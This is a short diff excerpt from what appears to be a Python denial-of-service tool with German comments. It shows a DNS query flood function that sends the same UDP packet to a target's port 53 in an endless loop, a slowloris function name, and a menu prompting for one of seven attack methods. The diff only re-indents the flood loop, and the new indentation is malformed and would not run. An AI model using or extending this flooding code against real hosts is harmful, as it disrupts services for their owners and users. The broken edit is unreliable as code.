@@ -90,9 +90,9 @@ def slowloris(ip, port):
 # DNS Query Flood verstärken
 def dns_flood(ip): server = (ip, 53) # Port 53 für DNS 
     query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01" # 2. Socket VOR der Schleife erstellen, um Ressourcen-Erschöpfung zu verhindern
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-    while True:
-        sock.sendto(query, server)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+            while True:
+            sock.sendto(query, server)
 
 # Auswahl der Methode
 method = input("Wähle die Angriffsmethode (1/2/3/4/5/6/7): ")
